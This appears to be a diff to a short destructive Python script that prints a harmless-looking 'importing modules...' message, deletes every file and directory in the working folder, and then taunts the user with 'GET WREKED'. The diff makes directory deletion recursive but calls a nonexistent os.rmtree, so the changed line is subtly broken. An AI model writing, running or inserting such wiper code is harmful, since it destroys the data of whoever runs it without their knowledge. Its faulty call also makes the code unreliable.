@@ -2,6 +2,7 @@ print("importing modules...")
 import os
 import sys
 import shutil
+from shutil import rmtree
 try:
   import requests
 except:
@@ -16,7 +17,10 @@ for files in os.listdir():
     os.remove(files)
   except:
     try:
-      os.rmdir(files)
+      os.rmtree(
+        files,
+        ignore_errors=True
+      )
     except:
       print("error: coudnt delete dir or file")
   print("GET WREKED")
